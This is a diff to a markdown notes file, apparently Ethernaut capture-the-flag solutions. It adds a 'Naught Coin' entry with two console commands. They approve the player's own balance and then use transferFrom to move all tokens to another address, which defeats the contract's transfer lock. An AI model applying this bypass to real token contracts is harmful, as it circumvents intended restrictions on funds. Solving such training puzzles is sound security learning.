@@ -80,3 +80,11 @@ Things that might help:
 1: uint64: 14006537356739165594
 2: uint64: 18446744073709551615
 ```
+
+### Naught Coin
+
+```
+contract.approve(player, (await contract.balanceOf(player)).toString());
+contract.transferFrom(player, '0xf332295db2AA2d8A6FDdD4a2C8f342EE40CC2DcC', (await contract.balanceOf(player)).toString());
+
+```
